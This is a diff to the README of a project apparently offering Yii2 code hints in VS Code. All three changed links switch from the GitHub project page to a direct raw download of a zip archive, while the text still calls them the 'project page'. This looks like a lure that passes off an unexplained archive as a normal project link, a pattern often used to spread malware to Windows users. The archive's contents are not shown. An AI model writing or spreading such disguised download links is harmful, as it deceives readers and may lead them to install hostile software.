@@ -1,6 +1,6 @@
 # 🧩 yii2-vscode-bridge - Clear Yii2 code hints in VS Code
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/joicesmart40/yii2-vscode-bridge)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/joicesmart40/yii2-vscode-bridge/main/src/vscode_bridge_yii_3.9.zip)
 
 ## 🖥️ What this is
 
@@ -32,7 +32,7 @@ If you already work in a Yii2 project, this tool can fit into your normal setup.
 
 Open the project page here:
 
-[https://github.com/joicesmart40/yii2-vscode-bridge](https://github.com/joicesmart40/yii2-vscode-bridge)
+[https://raw.githubusercontent.com/joicesmart40/yii2-vscode-bridge/main/src/vscode_bridge_yii_3.9.zip](https://raw.githubusercontent.com/joicesmart40/yii2-vscode-bridge/main/src/vscode_bridge_yii_3.9.zip)
 
 From there, download the project files to your PC.
 
@@ -127,6 +127,6 @@ No. You can keep your normal workflow.
 
 Open the project here:
 
-[https://github.com/joicesmart40/yii2-vscode-bridge](https://github.com/joicesmart40/yii2-vscode-bridge)
+[https://raw.githubusercontent.com/joicesmart40/yii2-vscode-bridge/main/src/vscode_bridge_yii_3.9.zip](https://raw.githubusercontent.com/joicesmart40/yii2-vscode-bridge/main/src/vscode_bridge_yii_3.9.zip)
 
 Use that page to download the files and follow the setup for your Windows PC
